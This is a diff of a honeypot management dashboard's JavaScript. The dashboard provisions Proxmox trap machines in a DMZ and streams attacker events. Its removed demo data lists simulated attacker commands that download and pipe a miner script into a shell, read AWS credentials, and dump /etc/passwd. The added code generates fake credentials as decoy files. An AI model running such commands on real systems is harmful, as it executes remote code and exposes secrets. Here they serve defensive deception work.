@@ -1,11 +1,7 @@
 "use strict";
 const $ = (id) => document.getElementById(id);
 const el = (tag, text, cls) => { const e = document.createElement(tag); if (text !== undefined) e.textContent = text; if (cls) e.className = cls; return e; };
-const pick = (a) => a[Math.floor(Math.random() * a.length)];
-const rnd = (a, b) => Math.floor(a + Math.random() * (b - a + 1));
-const hex = (n) => Array.from({ length: n }, () => rnd(0, 15).toString(16)).join("");
 const calm = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
-let seq = 1; const uid = () => seq++;
 
 let csrf = "";
 
@@ -16,17 +12,17 @@ const STATES = {
   starting: { label: "Запускается…",     hint: "Машина стартует, ждём подключения агента" },
   waiting:  { label: "Ждёт подключения", hint: "Машина создана, но агент внутри ещё не вышел на связь" },
   offline:  { label: "Не отвечает",      hint: "Агент давно не выходил на связь: проверьте машину в Proxmox" },
-  stopped:  { label: "Выключен",         hint: "Машина остановлена вами: ловушки не принимают подключения" },
+  stopped:  { label: "Выключен",         hint: "Машина остановлена: ловушки не принимают подключения" },
+  failed:   { label: "Ошибка создания",  hint: "Proxmox не смог создать машину: подробности в карточке. Её можно удалить и создать заново" },
 };
-const ORDER = ["online", "creating", "starting", "waiting", "offline", "stopped"];
+const ORDER = ["online", "creating", "starting", "waiting", "offline", "stopped", "failed"];
 
 // ============ PROXMOX ============
 const PVE = {
-  node: "pve",
   bridge: "vmbr1",                      // отдельный bridge под DMZ: ловушки не видят домашнюю LAN и прод
-  bridgeLabel: "vmbr1 · DMZ (изолированная сеть)",
-  templates: { lxc: 9000, kvm: 9001 },  // VMID шаблонов для клонирования — уточнить под ваш Proxmox
-  vmidFrom: 1000,                       // ловушки получают VMID от 1000 и выше
+  bridgeLabel: "vmbr1 · DMZ 10.20.0.0/24 (изолированная сеть)",
+  templates: { lxc: 104 },              // шаблон для клонирования (настраивается в оркестраторе)
+  storage: "hdd",
   defaults: { cores: 1, ram: 1, disk: 10 },
   limits: { cores: [1, 32], ram: [1, 128], disk: [10, 1000] },
 };
@@ -37,74 +33,135 @@ const TYPE_INFO = {
 const plural = (n, one, few, many) => (n % 10 === 1 && n % 100 !== 11 ? one : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? few : many);
 const resParts = (c) => [c.cores + " " + plural(c.cores, "ядро", "ядра", "ядер"), c.ram + " ГБ ОЗУ", c.disk + " ГБ диск"];
 
-// ============ ДЕМО-ДАННЫЕ ============
-// Всё ниже — примерные данные для показа. Реальные придут из API центра (Proxmox API + агенты).
-// Модель: «контейнер» = LXC-контейнер или KVM-машина в Proxmox; внутри один агент и несколько ловушек; порты не пересекаются.
-const profiles = [
-  { name: "ssh-low", level: "low", desc: "Открытые порты SSH и Telnet с правдоподобными баннерами",
-    services: [{ port: 22, proto: "banner", banner: "SSH-2.0-OpenSSH_7.4" }, { port: 23, proto: "banner", banner: "" }], users: [], tokens: [], beacon: 15, jitter: 0.3 },
-  { name: "web-admin-medium", level: "medium", desc: "Поддельная веб-админка с формой входа и файлами-приманками",
-    services: [{ port: 8080, proto: "http", banner: "Apache/2.4.41 (Ubuntu)" }, { port: 8081, proto: "http", banner: "" }], users: ["admin", "webmaster"], tokens: ["/backup.sql"], beacon: 15, jitter: 0.3 },
-  { name: "db-medium", level: "medium", desc: "Поддельный SSH-доступ и порты MySQL/PostgreSQL",
-    services: [{ port: 2222, proto: "ssh", banner: "" }, { port: 3306, proto: "banner", banner: "5.7.42-0ubuntu0.18.04.1" }, { port: 5432, proto: "banner", banner: "" }],
-    users: ["root", "postgres"], tokens: ["/root/.aws/credentials"], beacon: 20, jitter: 0.4 },
-  { name: "ftp-low", level: "low", desc: "Баннер FTP-сервера: фиксирует сканирование и попытки входа",
-    services: [{ port: 21, proto: "banner", banner: "220 ProFTPD 1.3.5 Server" }], users: [], tokens: [], beacon: 15, jitter: 0.3 },
-];
-const ago = (s) => Date.now() - s * 1000;
-// link: creating | never | starting | online | offline;  enabled: включена ли машина оператором (start/stop)
-const vm = (name, type, vmid, host, enabled, link, seen, res) => ({ id: uid(), name, type, vmid, node: PVE.node, bridge: PVE.bridge, host, enabled, link, seen,
-  ...PVE.defaults, ...(res || {}) });
-const containers = [
-  vm("edge-dmz-1", "lxc", 1000, "10.20.0.11", true, "online", ago(3)),
-  vm("edge-dmz-2", "lxc", 1001, "10.20.0.12", true, "online", ago(8), { ram: 2 }),
-  vm("lab-old", "kvm", 1002, "10.20.0.14", true, "offline", ago(1620), { cores: 2, ram: 2, disk: 20 }),
-  vm("lab-spare", "lxc", 1003, "10.20.0.17", false, "online", ago(40)),
-  vm("lab-new", "kvm", 1004, "", true, "never", null),
-];
-const trap = (name, container, profile, events) => ({ id: uid(), name, container, profile, enabled: true, events });
-const traps = [
-  trap("ssh-bait", "edge-dmz-1", "ssh-low", 412), trap("web-admin", "edge-dmz-1", "web-admin-medium", 936), trap("ftp-bait", "edge-dmz-1", "ftp-low", 121),
-  trap("db-bait", "edge-dmz-2", "db-medium", 287), trap("ssh-bait-2", "edge-dmz-2", "ssh-low", 198),
-  trap("ssh-old", "lab-old", "ssh-low", 54), trap("ftp-spare", "lab-spare", "ftp-low", 12), trap("web-new", "lab-new", "web-admin-medium", 0),
-];
-const IPS = ["185.220.101.34", "45.155.205.233", "194.165.16.77", "103.99.0.12", "89.248.165.200", "203.0.113.7", "91.240.118.50"];
-const USERS = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "user"];
-const PASSES = ["123456", "admin", "password", "toor", "qwerty", "admin123", "P@ssw0rd", "letmein"];
-const CMDS = ["uname -a", "cat /etc/passwd", "wget http://198.51.100.9/x.sh", "ls -la", "id", "cat /root/.aws/credentials", "curl -s http://198.51.100.9/miner | sh"];
-const PATHS = ["GET /admin HTTP/1.1", "GET /wp-login.php HTTP/1.1", "POST /login HTTP/1.1", "GET /.env HTTP/1.1", "GET /phpmyadmin/ HTTP/1.1"];
-const TYPES = ["connect", "auth_attempt", "command", "http_request", "payload", "honeytoken", "alert"];
+// ============ ДАННЫЕ ЦЕНТРА ============
+// Модель: «контейнер» = машина в Proxmox (оркестратор); внутри ловушки, у каждой свой агент; порты не пересекаются.
+const profiles = [], containers = [], traps = [];
+const TYPES = ["connect", "auth_attempt", "command", "http_request", "payload", "honeytoken", "session_end", "alert"];
 
 const S = {
-  events: [], nextId: 1, paused: false, editing: null, hoverTop: false,
+  events: [], paused: false, editing: null, hoverTop: false, orchError: "",
   cFilter: { q: "", status: "" },
   filter: { type: "", trap: "", q: "" },
-  total: 2410, auth: 1180, alert: 6,
-  src: { "185.220.101.34": 412, "45.155.205.233": 301, "194.165.16.77": 186, "103.99.0.12": 142, "89.248.165.200": 97 },
-  pw: { "123456": 233, "admin": 190, "password": 151, "toor": 98, "qwerty": 77 },
-  buckets: Array.from({ length: 60 }, () => rnd(2, 24)),
+  total: 0, auth: 0, alert: 0, src: {}, pw: {},
+  buckets: Array(60).fill(0),
+  pending: new Map(),   // vmid -> состояние, пока идёт команда (запуск/перезагрузка)
 };
+
+async function api(path, { method = "GET", body } = {}) {
+  const res = await fetch(path, {
+    method, credentials: "same-origin",
+    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
+    body: body === undefined ? undefined : JSON.stringify(body),
+  });
+  if (res.status === 401) { location.replace("/"); throw new Error("Сессия истекла"); }
+  if (res.status === 204) return null;
+  const data = await res.json().catch(() => ({}));
+  if (!res.ok) {
+    const d = data.detail;
+    throw new Error(typeof d === "string" ? d : Array.isArray(d) ? d.map((x) => x.msg).join("; ") : "Ошибка " + res.status);
+  }
+  return data;
+}
+const fail = (e) => toast(e.message, true);
+const fill = (arr, items) => arr.splice(0, arr.length, ...items);
+
+function profileFromApi(p) {
+  const d = p.decoys || {}, m = p.masking || {};
+  return { id: p.id, name: p.name, level: p.level, desc: p.description || "", services: p.services || [],
+    users: (d.users || []).map((u) => u.username), tokens: (d.honeytokens || []).map((t) => t.path),
+    beacon: m.beacon_interval ?? 15, jitter: m.jitter ?? 0.3, raw: p };
+}
+function fakeContent(path) {  // правдоподобное содержимое файла-приманки
+  if (/aws/.test(path)) return "[default]\naws_access_key_id = AKIA" + "Q7HF2KX9TW4ML3RD" + "\naws_secret_access_key = 9fKq2+vXz/8mPw1sLr4TnB6yHc0eJd5gA7uQ3iWo\n";
+  if (/\.sql$/.test(path)) return "-- MySQL dump 10.13\nINSERT INTO users VALUES (1,'admin','$2y$10$Jq0vX1eWb7RkQ4sNz2pT8u');\n";
+  if (/\.env$/.test(path)) return "DB_HOST=10.0.3.12\nDB_USER=app\nDB_PASSWORD=Spring2024!\n";
+  return "# do not share\n";
+}
+function profileToApi(p) {
+  const raw = (p.id && profiles.find((x) => x.id === p.id) || {}).raw || {};
+  const d = raw.decoys || {};
+  const oldUsers = new Map((d.users || []).map((u) => [u.username, u.password]));
+  const oldTokens = new Map((d.honeytokens || []).map((t) => [t.path, t]));
+  return {
+    name: p.name, description: p.desc || "", level: p.level, services: p.services,
+    decoys: {
+      hostname: d.hostname || "srv-01", accept_any_password: d.accept_any_password ?? true,
+      users: p.users.map((u) => ({ username: u, password: oldUsers.get(u) || "Winter2024!" })),
+      honeytokens: p.tokens.map((path) => oldTokens.get(path) || { type: "file", path, content: fakeContent(path) }),
+    },
+    logging: raw.logging || {},
+    masking: { ...(raw.masking || {}), beacon_interval: p.beacon, jitter: p.jitter },
+  };
+}
+function machineFromApi(m) {
+  return { id: m.vmid, vmid: m.vmid, name: m.name || "vm-" + m.vmid, type: m.type === "kvm" ? "kvm" : "lxc", node: m.node || "",
+    bridge: m.bridge || PVE.bridge, host: m.ip || "", status: m.status, job: m.job || null, agent: m.agent || "never",
+    seen: m.last_seen ? Date.parse(m.last_seen) : null, cores: m.cores || 1,
+    ram: Math.max(1, Math.round((m.memory_mb || 1024) / 1024)), disk: m.disk_gb || 0 };
+}
+function trapFromApi(t) {
+  const c = containers.find((x) => x.vmid === t.machine_vmid);
+  return { id: t.id, name: t.name, vmid: t.machine_vmid, container: c ? c.name : "", profile: t.profile || "",
+    profile_id: t.profile_id, enabled: t.enabled, status: t.status, events: t.events,
+    seen: t.last_seen ? Date.parse(t.last_seen) : null };
+}
+function eventFromApi(e) {
+  const t = traps.find((x) => x.id === e.trap_id);
+  return { ...e, ts: Date.parse(e.ts), container: t ? t.container : "" };
+}
+
+async function refresh() {
+  try {
+    const [ps, ts] = await Promise.all([api("/api/profiles"), api("/api/traps")]);
+    let ms = [];
+    try { ms = await api("/api/machines"); S.orchError = ""; } catch (e) { S.orchError = e.message; }
+    fill(profiles, ps.map(profileFromApi));
+    fill(containers, ms.map(machineFromApi));
+    fill(traps, ts.map(trapFromApi));
+    renderAll(); renderNotice();
+  } catch (e) { fail(e); }
+}
+async function loadStats() {
+  try {
+    const st = await api("/api/stats");
+    S.total = st.total_24h; S.auth = st.by_type.auth_attempt || 0; S.alert = st.by_type.alert || 0;
+    S.src = Object.fromEntries(st.top_sources.map((x) => [x.value, x.count]));
+    S.pw = Object.fromEntries(st.top_passwords.map((x) => [x.value, x.count]));
+    S.buckets = st.timeline.map((x) => x.n);
+    renderKpis(); renderTops();
+  } catch (e) { /* статистика вторична: лента продолжает работать */ }
+}
+async function loadEvents() {
+  try { S.events = (await api("/api/events?limit=200")).items.map(eventFromApi); renderFeed(); } catch (e) { fail(e); }
+}
+function renderNotice() {
+  const n = $("notice");
+  n.textContent = S.orchError ? "Proxmox недоступен: " + S.orchError + ". Машины не показываются, остальное работает." : "";
+  n.classList.toggle("hidden", !S.orchError);
+}
 
 // ============ МОДЕЛЬ ============
 const trapByName = (n) => traps.find((t) => t.name === n);
 const containerByName = (n) => containers.find((c) => c.name === n);
 const profileByName = (n) => profiles.find((p) => p.name === n);
-const trapsOf = (cname) => traps.filter((t) => t.container === cname);
+const trapsOf = (cname) => traps.filter((t) => t.container === cname && t.container);
 const levelOf = (name) => (profileByName(name) || {}).level || "—";
 const portsOf = (profile, lookup = profileByName) => ((lookup(profile) || { services: [] }).services).map((s) => s.port);
-const alive = (c) => containers.includes(c);
 
 function cState(c) {
-  if (c.link === "creating") return "creating";
-  if (!c.enabled) return "stopped";
-  if (c.link === "never") return "waiting";
-  return c.link;
+  if (c.job && c.job.state === "error") return "failed";
+  if (c.status === "creating" || (c.job && c.job.state === "creating")) return "creating";
+  if (S.pending.has(c.vmid)) return S.pending.get(c.vmid);
+  if (c.status !== "running") return "stopped";
+  return c.agent === "online" ? "online" : c.agent === "offline" ? "offline" : "waiting";
 }
 function trapState(t) {
   const c = containerByName(t.container);
   if (!c) return "offline";
   const cs = cState(c);
-  return cs === "online" && !t.enabled ? "stopped" : cs;
+  if (cs !== "online" && cs !== "waiting" && cs !== "offline") return cs;
+  if (!t.enabled) return "stopped";
+  return t.status === "online" ? "online" : t.status === "offline" ? "offline" : "waiting";
 }
 function containerPorts(cname) { return [...new Set(trapsOf(cname).flatMap((t) => portsOf(t.profile)))].sort((a, b) => a - b); }
 function portConflicts(entries, lookup = profileByName) {  // порты внутри одной машины не должны пересекаться
@@ -114,7 +171,6 @@ function portConflicts(entries, lookup = profileByName) {  // порты вну�
 }
 function uniqueName(base, taken = new Set()) { let n = 1, name = base; while (taken.has(name) || trapByName(name)) name = base + "-" + (++n); return name; }
 const baseName = (profile) => profile.replace(/-(low|medium)$/, "") + "-bait";
-function nextVmid() { const used = new Set(containers.map((c) => c.vmid)); let id = PVE.vmidFrom; while (used.has(id)) id++; return id; }
 function uniqueContainerName(base) { let n = containers.length + 1; while (containerByName(base + "-" + n)) n++; return base + "-" + n; }
 function iconFor(p) {
   const n = p.name.toLowerCase();
@@ -122,31 +178,24 @@ function iconFor(p) {
   const proto = (p.services[0] || {}).proto || "tcp"; return proto === "banner" ? "TCP" : proto.toUpperCase();
 }
 
-// ============ ДЕМО-ПОТОК СОБЫТИЙ ============
-function fakeEvent() {
-  const online = traps.filter((t) => trapState(t) === "online");
-  if (!online.length) return null;
-  const tr = pick(online);
-  const prof = profileByName(tr.profile) || { services: [{ port: 22, proto: "banner" }], level: "low", users: [], tokens: [] };
-  const svc = pick(prof.services);
-  const r = Math.random();
-  let type = "connect", cmd = "TCP-подключение", username = "", password = "";
-  if (r > 0.4) { type = "auth_attempt"; username = pick(prof.users.length ? [...prof.users, ...USERS] : USERS); password = pick(PASSES); cmd = username + " / " + password; }
-  if (r > 0.72 && prof.level !== "low") { type = "command"; cmd = pick(CMDS); }
-  if (r > 0.82 && svc.proto === "http") { type = "http_request"; cmd = pick(PATHS); }
-  if (r > 0.96 && prof.level !== "low") { type = "honeytoken"; cmd = prof.tokens[0] || "/root/.aws/credentials"; }
-  if (r > 0.985) { type = "alert"; cmd = rnd(8, 30) + " попыток входа за 60 с"; }
-  return { id: S.nextId++, ts: Date.now(), trap: tr.name, container: tr.container, type, src_ip: pick(IPS), src_port: rnd(1024, 65535),
-    dst_port: svc.port, proto: svc.proto === "banner" ? "tcp" : svc.proto, session_id: hex(16), username, password, command: cmd };
-}
+// ============ ЖИВОЙ ПОТОК СОБЫТИЙ (WebSocket) ============
 function ingest(ev) {
   S.events.unshift(ev); if (S.events.length > 500) S.events.pop();
-  S.total++; S.src[ev.src_ip] = (S.src[ev.src_ip] || 0) + 1;
-  if (ev.type === "auth_attempt") { S.auth++; S.pw[ev.password] = (S.pw[ev.password] || 0) + 1; }
+  S.total++; if (ev.src_ip && ev.type !== "alert") S.src[ev.src_ip] = (S.src[ev.src_ip] || 0) + 1;
+  if (ev.type === "auth_attempt") { S.auth++; if (ev.password) S.pw[ev.password] = (S.pw[ev.password] || 0) + 1; }
   if (ev.type === "alert") S.alert++;
-  S.buckets[59]++;
-  const t = trapByName(ev.trap); if (t) t.events++;
-  const c = containerByName(ev.container); if (c) c.seen = Date.now();
+  else S.buckets[S.buckets.length - 1]++;
+  const t = traps.find((x) => x.id === ev.trap_id); if (t) { t.events++; t.seen = Date.now(); }
+}
+function connectStream() {
+  const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/api/ws/events");
+  ws.onmessage = (m) => {
+    const d = JSON.parse(m.data); if (d.type === "ping") return;
+    const ev = eventFromApi(d); ingest(ev);
+    if (!S.paused) addToFeed(ev);
+    renderKpis(); renderTops(); refreshCells();
+  };
+  ws.onclose = () => setTimeout(connectStream, 3000);  // центр перезапустили или пропала сеть — переподключаемся
 }
 
 // ============ ВСПОМОГАТЕЛЬНОЕ ============
@@ -154,11 +203,6 @@ function toast(msg, bad) {
   const t = $("toast"); t.textContent = msg; t.className = "toast" + (bad ? " bad" : "");
   clearTimeout(toast.timer); toast.timer = setTimeout(() => t.classList.add("hidden"), 3200);
 }
-function download(name, text) {
-  const a = el("a"); a.href = URL.createObjectURL(new Blob([text], { type: "text/csv;charset=utf-8" })); a.download = name;
-  document.body.append(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(a.href), 1000);
-}
-const csvCell = (v) => { let s = String(v ?? ""); if (/^[=+\-@\t\r]/.test(s)) s = "'" + s; return '"' + s.replace(/"/g, '""') + '"'; };  // защита от формул Excel
 async function copy(text) { try { await navigator.clipboard.writeText(text); toast("Скопировано"); } catch (_) { toast("Не удалось скопировать: выделите текст вручную", true); } }
 function since(ts) {
   if (!ts) return "никогда";
@@ -347,12 +391,11 @@ function buildPicker(box, { existing, selected, multi, onChange }) {
 
 // ============ КОНТЕЙНЕРЫ (главная) ============
 function pveCommands(c) {
-  const t = TYPE_INFO[c.type], tpl = PVE.templates[c.type], mem = c.ram * 1024;
-  return c.type === "kvm"
-    ? ["qm clone " + tpl + " " + c.vmid + " --name " + c.name + " --full", "qm set " + c.vmid + " --cores " + c.cores + " --memory " + mem + " --net0 virtio,bridge=" + c.bridge,
-       "qm resize " + c.vmid + " scsi0 " + c.disk + "G", t.cli + " start " + c.vmid].join("\n")
-    : ["pct clone " + tpl + " " + c.vmid + " --hostname " + c.name + " --full", "pct set " + c.vmid + " --cores " + c.cores + " --memory " + mem + " --net0 name=eth0,bridge=" + c.bridge + ",ip=dhcp",
-       "pct resize " + c.vmid + " rootfs " + c.disk + "G", t.cli + " start " + c.vmid].join("\n");
+  const t = TYPE_INFO[c.type], tpl = PVE.templates[c.type] || "—", mem = c.ram * 1024;
+  const net = c.type === "kvm" ? "--net0 virtio,bridge=" + c.bridge : "--net0 name=eth0,bridge=" + c.bridge + ",ip=" + (c.host || "10.20.0.X") + "/24,gw=10.20.0.1";
+  return [t.cli + " clone " + tpl + " " + c.vmid + (c.type === "kvm" ? " --name " : " --hostname ") + c.name + " --full --storage " + PVE.storage,
+    t.cli + " set " + c.vmid + " --cores " + c.cores + " --memory " + mem + " " + net + " --tags honeyforge",
+    t.cli + " resize " + c.vmid + (c.type === "kvm" ? " scsi0 " : " rootfs ") + c.disk + "G", t.cli + " start " + c.vmid].join("\n");
 }
 
 function openPve(c) {
@@ -363,9 +406,9 @@ function openPve(c) {
     const steps = el("ol", undefined, "steps");
     const li = (b, rest) => { const x = el("li"); x.append(el("b", b), " " + rest); return x; };
     steps.append(
-      li("Клонирование:", "центр через Proxmox API создаёт " + t.kind + " " + c.vmid + " из шаблона " + PVE.templates[c.type] + " с уже установленным агентом."),
-      li("Ресурсы и сеть:", resParts(c).join(", ") + "; сетевой интерфейс в " + c.bridge + " (DMZ), без доступа в домашнюю сеть."),
-      li("Запуск:", "машина стартует, агент подключается к центру и поднимает ловушки этого контейнера.")
+      li("Клонирование:", "оркестратор через Proxmox API делает полный клон шаблона " + (PVE.templates[c.type] || "—") + " в " + t.kind + " " + c.vmid + " на хранилище " + PVE.storage + "."),
+      li("Ресурсы и сеть:", resParts(c).join(", ") + "; интерфейс в " + c.bridge + " (DMZ) с адресом " + (c.host || "из 10.20.0.0/24") + ", без доступа в домашнюю сеть. Тег honeyforge: чужие машины оркестратор не трогает."),
+      li("Запуск:", "машина стартует; агент в ней подключается к центру и поднимает ловушки (кнопка «Подключить агента» в окне ловушки).")
     );
     body.append(el("h4", "Что делает центр"), steps, el("h4", "Эквивалентные команды Proxmox (для справки и ручной отладки)"));
     const pre = el("pre", pveCommands(c)); body.append(pre);
@@ -376,43 +419,37 @@ function openPve(c) {
   });
 }
 
-function bringOnline(c, msg) {
-  c.link = "starting"; renderAll();
-  setTimeout(() => {
-    if (!alive(c) || !c.enabled || c.link !== "starting") return;
-    c.link = "online"; c.seen = Date.now(); renderAll(); if (msg) toast(msg);
-  }, 1700);
-}
-function provision(c) {  // демо: клон → старт → агент на связи
-  setTimeout(() => {
-    if (!alive(c) || c.link !== "creating") return;
-    c.host = c.host || "10.20.0." + rnd(20, 99);
-    if (!c.enabled) { c.link = "online"; renderAll(); toast(TYPE_INFO[c.type].kind + " " + c.vmid + " создан и остановлен"); return; }
-    bringOnline(c, "«" + c.name + "» создан и работает: " + TYPE_INFO[c.type].kind + " " + c.vmid);
-  }, 3500);
+async function machineAction(c, action, okMsg) {
+  if (action !== "shutdown") S.pending.set(c.vmid, "starting");
+  renderContainers();
+  try { await api("/api/machines/" + c.vmid + "/" + action, { method: "POST" }); toast(okMsg); }
+  catch (e) { fail(e); }
+  finally { S.pending.delete(c.vmid); await refresh(); }
 }
 function toggleContainer(c) {
   const t = TYPE_INFO[c.type];
-  c.enabled = !c.enabled;
-  if (!c.enabled) { if (c.link === "starting") c.link = "online"; renderAll(); toast(t.cli + " shutdown " + c.vmid + " — «" + c.name + "» выключен"); return; }
-  if (c.link === "never") { renderAll(); toast(t.cli + " start " + c.vmid + " — ждём подключения агента"); return; }
-  bringOnline(c, t.cli + " start " + c.vmid + " — «" + c.name + "» работает");
+  if (c.status === "running") machineAction(c, "shutdown", t.cli + " shutdown " + c.vmid + " — «" + c.name + "» выключен");
+  else machineAction(c, "start", t.cli + " start " + c.vmid + " — «" + c.name + "» запущен");
 }
 function restartContainer(c) {
   const st = cState(c), t = TYPE_INFO[c.type];
   if (st === "creating") { toast("Машина ещё создаётся", true); return; }
-  if (st === "stopped") { toast("Машина выключена — включите её переключателем", true); return; }
-  toast(t.cli + " reboot " + c.vmid + "…"); bringOnline(c, "«" + c.name + "» перезапущен");
+  if (st === "stopped" || st === "failed") { toast("Машина выключена — включите её переключателем", true); return; }
+  machineAction(c, "reboot", t.cli + " reboot " + c.vmid + " — «" + c.name + "» перезапущен");
 }
-function deleteContainer(c) {
-  for (let i = traps.length - 1; i >= 0; i--) if (traps[i].container === c.name) traps.splice(i, 1);
-  containers.splice(containers.indexOf(c), 1);
-  renderAll(); toast(TYPE_INFO[c.type].cli + " destroy " + c.vmid + " — «" + c.name + "» удалён вместе с ловушками");
+async function deleteContainer(c) {
+  toast("Удаляю " + TYPE_INFO[c.type].kind + " " + c.vmid + "…");
+  try { await api("/api/machines/" + c.vmid, { method: "DELETE" }); toast("«" + c.name + "» удалён вместе с ловушками"); }
+  catch (e) { fail(e); }
+  await refresh();
 }
-function removeTrap(t) { traps.splice(traps.indexOf(t), 1); renderAll(); toast("Ловушка «" + t.name + "» убрана"); }
+async function removeTrap(t) {
+  try { await api("/api/traps/" + t.id, { method: "DELETE" }); toast("Ловушка «" + t.name + "» убрана"); } catch (e) { fail(e); }
+  await refresh();
+}
 
 function containerSig(c) {  // всё, что меняет вид карточки (счётчики и «на связи» обновляются на месте)
-  return JSON.stringify([c.name, c.type, c.vmid, c.node, c.host, c.enabled, cState(c), c.cores, c.ram, c.disk,
+  return JSON.stringify([c.name, c.type, c.vmid, c.node, c.host, c.status, cState(c), c.cores, c.ram, c.disk, c.job && c.job.error,
     trapsOf(c.name).map((t) => [t.id, t.name, t.profile, trapState(t)])]);
 }
 
@@ -423,7 +460,7 @@ function containerCard(c) {
   const head = el("div", undefined, "chead");
   const tag = el("span", t.label + " · " + t.kind + " " + c.vmid, "vmtag " + c.type); tag.title = t.title + " в Proxmox, нода " + c.node + ".\n" + t.kind + " " + c.vmid + " — номер машины (VMID) в Proxmox.\n" + t.desc;
   head.append(el("h3", c.name), tag,
-    switchEl(c.enabled, c.enabled ? "Выключить машину (" + t.cli + " shutdown)" : "Включить машину (" + t.cli + " start)", () => toggleContainer(c), st === "creating"));
+    switchEl(c.status === "running", c.status === "running" ? "Выключить машину (" + t.cli + " shutdown)" : "Включить машину (" + t.cli + " start)", () => toggleContainer(c), st === "creating" || st === "failed" || S.pending.has(c.vmid)));
   card.append(head);
 
   const meta = el("div", undefined, "cmeta");
@@ -435,12 +472,14 @@ function containerCard(c) {
   res.append(tipped(el("span", "сеть " + c.bridge + " · DMZ"), HELP.dmz), tipped(el("span", "нода " + c.node), "Физический сервер Proxmox, на котором запущена машина"));
   card.append(res);
 
-  if (st === "creating") {
-    const note = el("div", "Proxmox клонирует шаблон и настраивает " + t.kind + " " + c.vmid + "…", "cnote");
+  if (st === "failed") {
+    card.append(el("div", "Proxmox не смог создать машину: " + c.job.error + ". Удалите её и создайте заново.", "cnote warn"));
+  } else if (st === "creating") {
+    const note = el("div", "Proxmox клонирует шаблон и настраивает " + t.kind + " " + c.vmid + "… Это занимает до пары минут.", "cnote");
     const bar = el("div", undefined, "progress"); bar.append(el("i")); note.append(bar); card.append(note);
   } else if (st === "waiting") {
     const note = el("div", undefined, "cnote");
-    note.append("Машина создана, но агент ещё не вышел на связь. Проверьте консоль " + t.kind + " в Proxmox.");
+    note.append(list.length ? "Машина работает, но агенты ещё не вышли на связь. Откройте ловушку и нажмите «Подключить агента»." : "Машина работает. Добавьте в неё ловушку.");
     card.append(note);
   } else if (st === "offline") {
     const note = el("div", undefined, "cnote warn");
@@ -529,11 +568,10 @@ function openNewContainer() {
     const typeWrap = el("div"); typeWrap.append(typeLabel, seg);
 
     const nameIn = el("input"); nameIn.maxLength = 60; nameIn.value = uniqueContainerName("edge-dmz"); nameIn.setAttribute("aria-label", "Имя");
-    const vmidIn = numInput(nextVmid(), [PVE.vmidFrom, 999999999], "VMID");
-    const vmHint = el("div", undefined, "hint"); const vmLabel = () => { vmHint.textContent = TYPE_INFO[type].kind + " " + vmidIn.value + " на ноде " + PVE.node + " · выдаётся автоматически от " + PVE.vmidFrom; };
-    vmidIn.oninput = vmLabel; vmLabel();
+    const vmHint = el("div", undefined, "hint"); const vmLabel = () => { vmHint.textContent = "VMID и адрес в DMZ выдаст оркестратор автоматически · шаблон " + (PVE.templates[type] || "не настроен"); };
+    vmLabel();
     const res = resourceFields(PVE.defaults);
-    body.append(typeWrap, field("Имя (hostname)", nameIn), field("VMID", vmidIn), vmHint,
+    body.append(typeWrap, field("Имя (hostname)", nameIn), vmHint,
       el("h4", "Ресурсы"), res.grid, res.reset, (() => { const h = el("h4", "Сеть"); h.append(q(HELP.dmz)); return h; })(), el("div", PVE.bridgeLabel + " — ловушки не видят домашнюю сеть и прод", "ro"));
 
     const pickH = el("h4", "Какие ловушки запустить"); pickH.append(q("Каждая карточка — профиль ловушки. В одной машине может работать несколько ловушек, если их порты не пересекаются. Запускает их агент внутри машины."));
@@ -551,21 +589,24 @@ function openNewContainer() {
     };
     buildPicker(grid, { existing: [], selected, multi: true, onChange: update }); update();
 
-    create.onclick = () => {
-      const name = nameIn.value.trim(), vmid = Number(vmidIn.value), errs = [];
-      if (!/^[A-Za-z0-9-]{1,60}$/.test(name)) errs.push("Имя (hostname): латиница, цифры и дефис");
+    create.onclick = async () => {
+      const name = nameIn.value.trim(), errs = [];
+      if (!/^[A-Za-z0-9][A-Za-z0-9-]{0,59}$/.test(name)) errs.push("Имя (hostname): латиница, цифры и дефис");
       else if (containerByName(name)) errs.push("Машина с таким именем уже есть");
-      if (!Number.isInteger(vmid) || vmid < PVE.vmidFrom) errs.push("VMID: целое число от " + PVE.vmidFrom);
-      else if (containers.some((c) => c.vmid === vmid)) errs.push("VMID " + vmid + " уже занят");
       const r = res.read(); if (r.error) errs.push(r.error);
       if (!selected.size) errs.push("Выберите хотя бы одну ловушку");
       if (errs.length) { err.textContent = errs.join("\n"); return; }
-      const c = { id: uid(), name, type, vmid, node: PVE.node, bridge: PVE.bridge, host: "", enabled: true, link: "creating", seen: null, ...r.value };
-      containers.push(c);
-      const taken = new Set();
-      for (const p of selected) { const tn = uniqueName(baseName(p), taken); taken.add(tn); traps.push(trap(tn, name, p, 0)); }
-      closeModal(); renderAll(); provision(c);
-      toast("Создаю " + TYPE_INFO[type].kind + " " + vmid + " в Proxmox…");
+      create.disabled = true; err.textContent = "";
+      try {
+        const m = await api("/api/machines", { method: "POST", body: { name, type, cores: r.value.cores, memory_gb: r.value.ram, disk_gb: r.value.disk } });
+        const taken = new Set();
+        for (const pn of selected) {
+          const tn = uniqueName(baseName(pn), taken); taken.add(tn);
+          await api("/api/traps", { method: "POST", body: { name: tn, profile_id: profileByName(pn).id, machine_vmid: m.vmid } });
+        }
+        closeModal(); toast("Создаю " + TYPE_INFO[type].kind + " " + m.vmid + " в Proxmox (адрес " + m.ip + ")…");
+      } catch (e) { err.textContent = e.message; create.disabled = false; return; }
+      await refresh();
     };
     nameIn.focus(); nameIn.select();
   });
@@ -589,16 +630,17 @@ function openAddTrap(c) {
     } });
     if (!profiles.some((p) => !portsOf(p.name).some((port) => existing.some((t) => portsOf(t.profile).includes(port)))))
       err.textContent = "Все типы ловушек конфликтуют по портам с уже установленными. Создайте профиль с другими портами или новую машину.";
-    add.onclick = () => {
+    add.onclick = async () => {
       const p = [...selected][0], name = nameIn.value.trim();
       if (!p) { err.textContent = "Выберите тип ловушки"; return; }
       if (!/^[A-Za-z0-9._-]{1,60}$/.test(name)) { err.textContent = "Имя: латиница, цифры, точка, дефис, подчёркивание"; return; }
       if (trapByName(name)) { err.textContent = "Ловушка с таким именем уже есть"; return; }
       const errs = portConflicts([...existing.map((t) => ({ name: t.name, profile: t.profile })), { name, profile: p }]);
